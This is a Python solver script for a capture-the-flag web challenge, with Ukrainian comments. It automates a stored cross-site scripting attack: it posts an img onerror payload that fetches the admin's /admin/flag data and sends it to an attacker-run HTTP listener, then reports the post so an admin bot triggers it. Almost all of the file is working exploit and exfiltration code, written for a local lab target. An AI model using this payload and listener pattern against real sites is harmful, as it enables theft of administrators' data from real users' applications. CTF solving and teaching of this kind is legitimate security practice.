#!/usr/bin/env python3
"""Автоматичний солвер: створює пост, смикає бота, ловить флаг.

Приклад (Docker, бот у контейнері):
    python3 solve/solve.py --exfil-host host.docker.internal

Приклад (локальний Python-запуск):
    python3 solve/solve.py --exfil-host 127.0.0.1
"""
import argparse
import re
import threading
import time
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

FLAG_RE = re.compile(r"CTF\{[^}]+\}")
found = threading.Event()
flag_box: list[str] = []


class Listener(BaseHTTPRequestHandler):
    def do_GET(self):  # noqa: N802
        text = urllib.parse.unquote(self.path)
        match = FLAG_RE.search(text)
        if match and not found.is_set():
            flag_box.append(match.group(0))
            found.set()
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *_args):
        pass


def http(url: str, data: dict | None = None) -> tuple[str, str]:
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    with urllib.request.urlopen(url, data=body, timeout=15) as response:
        return response.geturl(), response.read().decode("utf-8", "replace")


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", default="http://127.0.0.1:5000")
    parser.add_argument("--exfil-host", default="host.docker.internal")
    parser.add_argument("--exfil-port", type=int, default=8000)
    parser.add_argument("--timeout", type=int, default=60)
    args = parser.parse_args()

    server = ThreadingHTTPServer(("0.0.0.0", args.exfil_port), Listener)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    print(f"[*] Listener: http://0.0.0.0:{args.exfil_port}")

    payload = (
        "<img src=x onerror=\"fetch('/admin/flag').then(r=>r.json())"
        ".then(d=>{new Image().src='http://"
        f"{args.exfil_host}:{args.exfil_port}/leak?f='+encodeURIComponent(d.flag)}})\">"
    )
    print(f"[*] Payload: {payload}")

    page_url, page = http(
        f"{args.base}/new",
        {
            "author": "pentester",
            "title": f"test {int(time.time())}",
            "body": payload,
        },
    )
    match = re.search(r"/post/(\d+)", page_url) or re.search(r"/post/(\d+)", page)
    if not match:
        raise SystemExit("[-] Could not create a post (is the app running?)")
    post_id = match.group(1)
    print(f"[+] Created post /post/{post_id}")

    http(f"{args.base}/report/{post_id}", {})
    print("[*] Report sent, waiting for the admin bot...")

    if not found.wait(args.timeout):
        raise SystemExit(
            "[-] Flag did not arrive. Check /healthz, networking, and the report cooldown."
        )

    print(f"\n[+] FLAG: {flag_box[0]}")
    server.shutdown()


if __name__ == "__main__":
    main()
